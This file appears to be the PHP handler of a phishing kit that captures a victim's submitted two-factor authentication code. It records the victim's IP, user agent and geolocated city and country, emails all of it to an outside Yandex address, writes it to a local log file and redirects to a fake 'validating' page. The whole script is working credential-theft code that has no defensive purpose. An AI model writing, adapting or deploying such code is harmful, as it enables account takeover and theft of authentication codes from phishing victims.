<?php
if($_POST["2factor"] != "" and $_POST["2factor"] != ""){
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$ip = $_SERVER['REMOTE_ADDR'];
	$time = time();
	$date = date("Y-m-d H:i:s");
	$ccn = $_POST['2factor'];
$ip = getenv("REMOTE_ADDR");
$hostname .= gethostbyaddr($ip);
$useragent .= $_SERVER['HTTP_USER_AGENT'];
$message .= '<html>
<head></head>
                    <body>
                        <table style="">
                            <tr>
                                <td style="font-weight: bold">2nd Two-Factor Auth:</td>
                                <td style="padding-left: 1em;">'.$_POST['2factor'].'</td>
                            </tr>
                           
                            <tr>
                                <td style="font-weight: bold">IP Address:</td>
                                <td style="padding-left: 1em;">'.$ip.'</td>
                            </tr>
							<tr>
							<td style="font-weight: bold">User Agent:</td>
							<td style="padding-left: 1em;">'.$useragent.'</td></tr>
                        </table>
                    </body>
                </html>';
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "City : {$geoplugin->city} \n";	
$message .= "Region : {$geoplugin->region}\n";	
$message .= "Country Name : {$geoplugin->countryName}\n";	
$message .= "Country Code : {$geoplugin->countryCode}\n";


$domain = 'New Mail';
 $from = "From: $domain<west>\n";
        $subject = "2nd Two-Factor Auth Result [$ccn] [$ip]";
        if(mail("fresh.logz@yandex.com",$subject,$message,$from,$domain))
	$fp = fopen("myresultsxxxxxxxxxxxxxxxxxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);
			$praga=rand();
$praga=md5($praga);
  header ("Location: validating.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
